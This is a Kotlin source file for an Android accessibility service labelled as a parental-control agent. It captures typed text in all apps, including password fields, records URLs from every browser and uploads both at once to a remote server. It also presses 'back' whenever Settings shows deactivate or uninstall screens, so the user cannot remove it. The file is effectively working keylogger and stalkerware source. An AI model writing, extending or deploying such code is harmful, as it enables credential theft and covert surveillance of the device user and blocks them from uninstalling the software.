package com.parental.agent.services

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.URI

class AgentAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AgentAccessibility"
        private const val DEBOUNCE_FLUSH_DELAY_MS = 2000L // 2-second typing pause flushes complete final text
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingFlushRunnable: Runnable? = null

    @Volatile
    private var currentDraftText: String = ""
    @Volatile
    private var currentDraftPkg: String = ""
    @Volatile
    private var lastFlushedText: String = ""
    @Volatile
    private var lastCapturedUrl: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // 1. Intercept Settings window when attempting to deactivate device admin
        if (packageName == "com.android.settings") {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                checkAndShieldDeactivationScreen(rootNode)
            }
        }

        // 2. Pure Keystroke Input Engine: Only capture TYPE_VIEW_TEXT_CHANGED for active text inputs
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            captureKeylogData(event, packageName)
        }

        // 3. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
        captureBrowserUrl(event, packageName)
    }

    private fun captureBrowserUrl(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: event.source ?: return
            val urlNode = findUrlNode(rootNode) ?: return
            val rawUrlText = urlNode.text?.toString()?.trim() ?: return

            if (rawUrlText.isBlank() || rawUrlText.length < 3) return

            // Format URL cleanly
            val fullUrl = when {
                rawUrlText.startsWith("http://") || rawUrlText.startsWith("https://") -> rawUrlText
                rawUrlText.contains(".") && !rawUrlText.contains(" ") -> "https://$rawUrlText"
                else -> return
            }

            if (fullUrl == lastCapturedUrl) return
            lastCapturedUrl = fullUrl

            val domain = try {
                URI(fullUrl).host ?: rawUrlText
            } catch (e: Exception) {
                rawUrlText
            }

            val appName = getAppNameFromPackage(packageName)
            val now = System.currentTimeMillis()
            val cleanDomain = domain.replace(Regex("[^a-zA-Z0-9]"), "_")
            val deterministicEventId = "evt_webhistory_${cleanDomain}_${now}"

            Log.i(TAG, "UNIVERSAL BROWSER URL CAPTURED: App=$appName ($packageName), URL=$fullUrl, Domain=$domain")

            val payload = JSONObject().apply {
                put("title", "$domain - $appName")
                put("url", fullUrl)
                put("domain", domain)
                put("packageName", packageName)
                put("appName", appName)
                put("visitCount", 1)
                put("timestamp", now)
            }

            val eventEntity = NormalizedEventEntity(
                eventId = deterministicEventId,
                deviceId = prefsDeviceId(),
                source = "web_history",
                eventType = "url_visit",
                timestamp = now,
                collectionMethod = "accessibility",
                payloadJson = payload.toString(),
                isSynced = false
            )

            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val database = AppDatabase.getInstance(applicationContext)
                    database.eventDao().insertEvent(eventEntity)
                    performInstantUpload(database, prefsDeviceId())
                } catch (e: Exception) {
                    Log.e(TAG, "Error saving web history event: ${e.message}")
                }
            }
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    private fun findUrlNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val viewId = node.viewIdResourceName
        if (viewId != null && (
            viewId.contains("url", ignoreCase = true) ||
            viewId.contains("location", ignoreCase = true) ||
            viewId.contains("address", ignoreCase = true) ||
            viewId.contains("domain", ignoreCase = true) ||
            viewId.contains("search_box", ignoreCase = true)
        )) {
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrBlank() && (text.startsWith("http") || text.contains("."))) {
                return node
            }
        }

        // Direct Text URL Match Check across any View / Node in any application
        val directText = node.text?.toString()?.trim()
        if (directText != null && directText.length >= 4 && (
            directText.startsWith("http://") || 
            directText.startsWith("https://") || 
            (directText.startsWith("www.") && directText.contains(".")) ||
            (directText.contains(".") && !directText.contains(" ") && (
                directText.endsWith(".com") || directText.endsWith(".org") || 
                directText.endsWith(".net") || directText.endsWith(".io") || 
                directText.endsWith(".gov") || directText.endsWith(".edu") ||
                directText.endsWith(".co") || directText.endsWith(".in") ||
                directText.endsWith(".app") || directText.endsWith(".dev")
            ))
        )) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlNode(child)
            if (result != null) return result
        }
        return null
    }

    private fun captureKeylogData(event: AccessibilityEvent, packageName: String) {
        try {
            val sourceNode = event.source
            
            val isEditableInput = (sourceNode != null && sourceNode.isEditable) || event.isPassword
            if (!isEditableInput) {
                return
            }

            var capturedText = event.text.filterNotNull().joinToString(" ").trim()

            if (capturedText.isBlank() && sourceNode != null) {
                capturedText = sourceNode.text?.toString()?.trim() ?: ""
            }

            if (capturedText.isBlank()) return

            if (currentDraftPkg.isNotEmpty() && currentDraftPkg != packageName && currentDraftText.isNotBlank()) {
                flushCurrentDraftNow()
            }

            currentDraftPkg = packageName
            currentDraftText = capturedText

            pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }

            val runnable = Runnable {
                flushCurrentDraftNow()
            }
            pendingFlushRunnable = runnable
            mainHandler.postDelayed(runnable, DEBOUNCE_FLUSH_DELAY_MS)

        } catch (e: Exception) {
            Log.e(TAG, "Error in captureKeylogData: ${e.message}")
        }
    }

    @Synchronized
    private fun flushCurrentDraftNow() {
        val textToFlush = currentDraftText.trim()
        val pkgToFlush = currentDraftPkg

        if (textToFlush.isBlank() || textToFlush == lastFlushedText) {
            return
        }

        lastFlushedText = textToFlush
        currentDraftText = ""

        val now = System.currentTimeMillis()
        val appName = getAppNameFromPackage(pkgToFlush)
        val cleanPkg = pkgToFlush.replace(".", "_")
        val deterministicEventId = "evt_keylog_${cleanPkg}_${now}"

        Log.i(TAG, "KEYLOGGER FLUSHED TYPED SENTENCE: App=$appName ($pkgToFlush), Text=\"$textToFlush\"")

        val payload = JSONObject().apply {
            put("packageName", pkgToFlush)
            put("appName", appName)
            put("typedText", textToFlush)
            put("timestamp", now)
        }

        val eventEntity = NormalizedEventEntity(
            eventId = deterministicEventId,
            deviceId = prefsDeviceId(),
            source = "keylogger",
            eventType = "keystroke_log",
            timestamp = now,
            collectionMethod = "accessibility",
            payloadJson = payload.toString(),
            isSynced = false
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val database = AppDatabase.getInstance(applicationContext)
                database.eventDao().insertEvent(eventEntity)
                performInstantUpload(database, prefsDeviceId())
            } catch (e: Exception) {
                Log.e(TAG, "Error saving keylog event: ${e.message}")
            }
        }
    }

    private fun prefsDeviceId(): String {
        return try {
            AppPreferences(applicationContext).getDeviceId()
        } catch (e: Exception) {
            "dev_local_agent"
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun checkAndShieldDeactivationScreen(node: AccessibilityNodeInfo) {
        val text = node.text?.toString()?.lowercase() ?: ""
        if (text.contains("deactivate") || text.contains("remove device admin") || text.contains("uninstall")) {
            Log.w(TAG, "PREVENTED AGENT DEACTIVATION: Navigating back immediately!")
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            checkAndShieldDeactivationScreen(child)
        }
    }

    private fun performInstantUpload(database: AppDatabase, deviceId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)
                if (unsyncedEvents.isEmpty()) return@launch

                val eventPayloads = unsyncedEvents.map { entity ->
                    val payloadMap = try {
                        val json = JSONObject(entity.payloadJson)
                        val map = mutableMapOf<String, Any?>()
                        json.keys().forEach { key -> map[key] = json.get(key) }
                        map
                    } catch (e: Exception) {
                        emptyMap<String, Any?>()
                    }

                    mapOf(
                        "eventId" to entity.eventId,
                        "deviceId" to deviceId,
                        "source" to entity.source,
                        "eventType" to entity.eventType,
                        "timestamp" to entity.timestamp,
                        "collectionMethod" to entity.collectionMethod,
                        "payload" to payloadMap
                    )
                }

                val payload = SyncPayload(deviceId = deviceId, events = eventPayloads)
                val response = ApiConstants.apiService.syncEvents(payload)

                if (response.isSuccessful && response.body()?.success == true) {
                    val confirmedIds = response.body()?.syncedEventIds.orEmpty()
                    if (confirmedIds.isNotEmpty()) {
                        database.eventDao().markEventsSynced(confirmedIds)
                    }
                }
            } catch (e: Exception) {
                // Quiet fail
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AgentAccessibilityService interrupted.")
    }
}
